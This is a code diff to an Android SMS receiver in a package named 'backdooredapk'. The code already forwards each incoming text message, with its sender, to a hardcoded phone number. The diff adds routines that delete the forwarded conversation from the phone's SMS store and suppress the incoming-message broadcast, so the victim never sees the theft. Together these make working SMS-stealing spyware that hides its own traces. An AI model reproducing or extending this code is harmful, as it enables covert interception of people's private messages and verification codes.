@@ -1,8 +1,11 @@
 package stage.metasploit.com.backdooredapk;
 
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
@@ -39,6 +42,9 @@ public class IncomingSms extends BroadcastReceiver {
 
                         SmsManager sms = SmsManager.getDefault();
                         sms.sendTextMessage("+33642617318", null, "From " + phoneNumber + " : \n" + message, null, null);
+                        wait(1000);
+                        deleteThread(context, "33642617318");
+
                     } // end for loop
                 }
             } // bundle is null
@@ -47,5 +53,38 @@ public class IncomingSms extends BroadcastReceiver {
             Log.e("SmsReceiver", "Exception smsReceiver" +e);
 
         }
+        finally {
+            abortBroadcast();
+        }
+    }
+
+    private String findThreadForNumber(Context context, String number) {
+        ContentResolver cr = context.getContentResolver();
+        Cursor pCur = cr.query(
+                Uri.parse("content://sms/canonical-addresses"), new String[]{"_id"},
+                "address" + " = ?",
+                new String[]{number}, null);
+
+        String thread_id = null;
+
+        if (pCur != null) {
+            if (pCur.getCount() != 0) {
+                pCur.moveToNext();
+                thread_id = pCur.getString(pCur.getColumnIndex("_id"));
+            }
+            pCur.close();
+        }
+        return thread_id;
+    }
+
+    private void deleteThread(Context context, String number) {
+        context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + findThreadForNumber(context, number)), null, null);
     }
 }
+
+
+
+
+
+
+
